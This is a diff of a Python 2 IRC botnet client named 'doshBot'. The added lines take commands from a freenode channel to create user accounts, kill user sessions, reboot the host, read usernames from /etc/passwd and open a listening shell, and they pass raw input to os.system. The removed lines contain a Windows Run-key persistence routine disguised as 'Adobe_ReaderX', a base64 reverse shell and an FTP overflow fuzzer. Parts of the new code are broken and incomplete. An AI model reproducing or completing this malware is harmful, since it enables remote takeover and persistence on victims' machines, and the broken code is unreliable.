@@ -1,118 +1,184 @@
 import subprocess, sys, base64, os, socket
-from _winreg import *
 from time import sleep
 
+info = "rip"
+newUser = "lol"
+newPass = "changme"
+
+###
+### Function to initiate irc connection and begin listening for commands.
+### When a user sends a recognized command it executes the respective function
+### 
 def ircConnect():
+	
+    #info for irc channel
     network = 'irc.freenode.net'
     port = 6667
-    nick = 'doshBot'
     channel = '#doshchannel'
-
+    password = 'password'
+    nick = "doshBot"
+   
+    #Connect to irc server and register nick
     irc = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
     irc.connect( (network, port) )
     print irc.recv( 4096 )
-    irc.send("USER " + nick + " " + nick + " " + nick + " :This is a test\n")
+    irc.send("USER " + nick + " " + nick + " " + nick + ":This is a test. \n")
     irc.send("NICK " + nick + "\n")
+    irc.send("PRIVMSG" + " NICKSERV :identify " + password + "\n")
     irc.send("JOIN " + channel + '\n')
-
+    
+    # Listen for commands
     while 1:
         text = irc.recv(2040)
         print text
-        #time.sleep(5)
         if(text.find('PING') != -1):
             irc.send('PONG ' + text.split()[1] + '\r\n')
 
-        if(text.find(':!speak') != -1):
-            irc.send('PRIVMSG ' + channel + ' :What up' + '\r\n')
+        elif(text.find(':!speak') != -1):
+            irc.send('PRIVMSG ' + channel + ' :This guy fucks' + '\r\n')
+	
+	elif(text.find(':!addUser') != -1):
+           temp = text.find(':!addUser')
+	   temp = int(temp) + 9
+	   if(text[temp:] != ""):
+	   	info = text[temp:]
+		info = info.strip().split()
+		newUser = info[0]
+	        newPass = info[1]
+		print newUser
+		print newPass
+	
+	   irc.send('PRIVMSG ' + channel + ' :User added.\r\n')
+	   addUser(newUser, newPass)
 
-        if(text.find(':!echo') != -1):
-            echo()
+	elif(text.find(':!reboot') != -1):
+	   reboot()
+	
+	elif(text.find(':!killUser') != -1):
+	   temp = text.find(':!killUser')
+	   temp = int(temp) + 10
+	   if(text[temp:] != ""):
+		user = text[temp:]
+		user = user.strip()
+		print user
+	
+	   irc.send('PRIVMSG ' + channel + ' :User killed.\r\n')
+	   killUser(user)
 
-        if(text.find(':!ping') != -1):
-            ping()
+	elif(text.find(':!dropShell'):
+            dropShell()
+ 
+	elif(text.find(':!listUsers') != -1):
+	    userList = listUsers()
+	    returnString = ""
+	    for x in userList:
+		returnString += (x + ', ')
+	    irc.send('PRIVMSG '+ channel + ' : ' + returnString + '\r\n')
+	    
+	elif(text.find(':!help') != -1):
+	    irc.send('PRIVMSG ' + channel + ' :Commands - !speak, !reboot, !findFile, !listUsers, !addUser [name] [password], killUser [user]\r\n')
 
-        if(text.find(':!fuzz') != -1):
-            fuzz()
 
-        if(text.find(':!switch') != -1):
-            switch()
+###
+### Call a reboot of the host computer
+### @params - none
+### @returns - none
+###
+def reboot():
+    os.system('reboot')
 
 
+###
+### Handle a request from the shell connection
+### @params - none
+### @returns - none
+###
+def handleClient():
+    
+    request = client_socket.recv(2048)
+    print request
+    client_socket.send("ACK!")
+    client_socket.close()
 
 
-def echo():
-    subprocess.call(['echo', 'hello'])
-
-def ping():
-    subprocess.call(['ping', '127.0.0.1'])
-
-def fuzz():
-    buffer = '\x41'*50
-    target = '129.21.134.17'
+###
+### Shell for remote to connect to
+### @params - none
+### @return - none
+###
+def shell()
+    
+    port = randint(10000, 20000)
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind = (('', port))
+    server.listen(5)
+    
     while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect((target, 21))
-            s.recv(1024)
+	
+	client, address = server.accept()
+	client_handler = threading.Thread(target=handle_client, args=(client,))
+	client_handler.start()
 
-            print "Sending buffer with length: " + str(len(buffer)-50)
-            s.send("USER " + buffer + "\r\n")
-            s.close()
-            sleep(1)
-            buffer = buffer + '\x41'*50
+###
+### Opens up a shell on the host machine
+### @params - none
+### @returns - the port and ip to connect to the shell
+###
+def dropShell():
+    
 
-        except:
-            print "Crash occured with buffer length: " + str(len(buffer) - 50)
-            return 0
+###
+### List the users found in /etc/passwd
+### @params - none
+### @returns - list of users in /etc/passwd(string)
+### 
+def listUsers():
+    output = []
+    os.system("awk -F':' '{ print $1}' /etc/passwd >> output.file")
+    f = open("output.file", "r")
+    for line in f:
+	line = line.replace('\n', '')
+	output += [line]
+    f.close()
+    os.system("rm output.file")
+    return output
 
-def autorun(tempdir, fileName, run):
-# Copy executable to %TEMP%:
-    os.system('copy %s %s'%(fileName, tempdir))
+###
+### Adds a user on the machine through the useradd command
+### @params - the name of the user(string), password for the user(string)
+### @returns - nothing
+###  
+def addUser(user, passw):
+    os.system('useradd ' + user + ' -p ' + passw)
 
-# Queries Windows registry for the autorun key value
-# Stores the key values in runkey array
-    key = OpenKey(HKEY_LOCAL_MACHINE, run)
-    runkey =[]
-    try:
-        i = 0
-        while True:
-            subkey = EnumValue(key, i)
-            runkey.append(subkey[0])
-            i += 1
-    except WindowsError:
-        pass
+###
+### Kills the session of the user specified
+### @params - name of the user(string)
+### @returns - nothing
+###
+def killUser(user):
+    os.system('skill -KILL -u ' + user)
 
-# If the autorun key "Adobe ReaderX" isn't set this will set the key:
-    if 'Adobe ReaderX' not in runkey:
-        try:
-            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
-            SetValueEx(key ,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%\mw.exe")
-            key.Close()
-        except WindowsError:
-            pass
-
-def shell():
-#Base64 encoded reverse shell
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('127.0.0.1', int(443)))
-    s.send('[*] Connection Established!')
-    while 1:
-        data = s.recv(1024)
-        if data == "quit": break
-        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        stdout_value = proc.stdout.read() + proc.stderr.read()
-        encoded = base64.b64encode(stdout_value)
-        s.send(encoded)
-        #s.send(stdout_value)
-    s.close()
-
-def switch():
-    tempdir = '%TEMP%'
-    fileName = sys.argv[0]
-    run = "Software\Microsoft\Windows\CurrentVersion\Run"
-    autorun(tempdir, fileName, run)
-    shell()
-
+###
+### main call to run program
+###
 if __name__ == '__main__':
     ircConnect()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
